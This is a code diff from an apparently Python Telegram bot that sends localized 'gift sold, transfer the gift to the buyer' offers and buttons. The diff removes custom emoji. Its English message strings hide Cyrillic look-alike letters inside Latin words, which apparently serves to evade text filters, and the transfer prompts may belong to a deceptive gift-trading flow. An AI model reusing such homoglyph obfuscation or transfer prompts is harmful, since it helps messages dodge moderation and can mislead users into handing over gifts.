@@ -72,8 +72,8 @@ def transfer_keyboard(url: str, locale: str, offer_id: int):
     labels = {"ru": "Передать\u2004", "en": "Transfer\u2004", "cn": "转赠\u2004", "ar": "نقل الهدية"}
     done_labels = {"ru": "\u2004Готово\u2004", "en": "\u2004Done\u2004", "cn": "\u2004完成\u2004", "ar": "\u2004تم\u2004"}
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)],
-        [InlineKeyboardButton(text=done_labels.get(locale, done_labels["ru"]), icon_custom_emoji_id=PREMIUM_EMOJI_ID, callback_data=f"of:done:{offer_id}")]
+        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), url=url)],
+        [InlineKeyboardButton(text=done_labels.get(locale, done_labels["ru"]), callback_data=f"of:done:{offer_id}")]
     ])
 
 
@@ -308,7 +308,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
 
     seller_name = " ".join(x for x in [bc["first_name"], bc["last_name"]] if x) or "Пользователь"
     title = gift_title(parsed["gift_name"], parsed["gift_number"])
-    amount = display_amount(parsed["amount"], parsed["currency"], with_emoji=True)
+    amount = display_amount(parsed["amount"], parsed["currency"])
     remaining = format_remaining((expires - now).total_seconds(), parsed["locale"])
     if parsed["locale"] == "en":
         body = f"Usеr <b>{seller_name}</b> оffers <b>{amount}</b> fоr thе gift <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nОffer ехpires in <b>{remaining}</b>."
@@ -1278,15 +1278,15 @@ async def offer_callback(call: CallbackQuery):
             url = offer["transfer_url"] or f"tg://user?id={offer['seller_id']}"
             title = html.escape(gift_title(offer["gift_name"], offer["gift_number"]))
             gift_url = html.escape(offer["gift_url"], quote=True)
-            amount_text = display_amount(offer['amount'], offer['currency'], with_emoji=True)
+            amount_text = display_amount(offer['amount'], offer['currency'])
             if offer["locale"] == "ru":
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, чтобы получить {amount_text}."
+                final = f"Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, чтобы получить {amount_text}."
             elif offer["locale"] == "cn":
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
+                final = f"礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
             elif offer["locale"] == "ar":
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> تم بيع الهدية <a href=\"{gift_url}\">{title}</a> بنجاح!\n\n• انقل الهدية إلى المشتري لتحصل على {amount_text}."
+                final = f"تم بيع الهدية <a href=\"{gift_url}\">{title}</a> بنجاح!\n\n• انقل الهدية إلى المشتري لتحصل على {amount_text}."
             else:
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Gift: <a href=\"{gift_url}\">{title}</a> suссеssfully sоld!\n\n• Trаnsfеr thе gift tо thе buyеr tо rесеivе {amount_text}."
+                final = f"Gift: <a href=\"{gift_url}\">{title}</a> suссеssfully sоld!\n\n• Trаnsfеr thе gift tо thе buyеr tо rесеivе {amount_text}."
             try:
                 sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final,
                     reply_markup=transfer_keyboard(url, offer["locale"], offer_id),
